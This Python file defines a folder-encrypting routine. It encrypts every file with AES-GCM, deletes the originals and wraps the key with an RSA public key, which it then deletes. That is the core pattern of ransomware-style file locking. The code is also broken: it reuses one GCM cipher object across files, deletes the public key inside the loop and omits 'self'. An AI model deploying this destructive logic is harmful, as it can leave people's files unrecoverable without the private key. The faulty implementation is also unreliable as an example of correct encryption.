from Crypto.Cipher import AES,PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import os
class encript:
    def encrypt_files(folder_path):
        AES_key=get_random_bytes(32)
        cipher=AES.new(AES_key,AES.MODE_GCM)
        for filename in os.listdir(folder_path):
            if filename.endswith(".enc") or filename in ["private.pem","publick.pem","encrypted_key.bin"]:
                continue
            path=os.path.join(folder_path,filename)
            with open(path,"rb")as f:
                data=f.read()
            ciphertext,tag=cipher.encrypt_and_digest(data)
            with open(path+".enc","wb")as f:
                f.write(cipher.nonce+tag+ciphertext)
            os.remove(path)
            publick_key=RSA.import_key(open("publick.pem").read())
            cipher_rsa=PKCS1_OAEP.new(publick_key)
            encrypted_key=cipher_rsa.encrypt(AES_key)
            with open("encrypted_key.bin","wb")as f:
                f.write(encrypted_key)
            os.remove("publick.pem")
    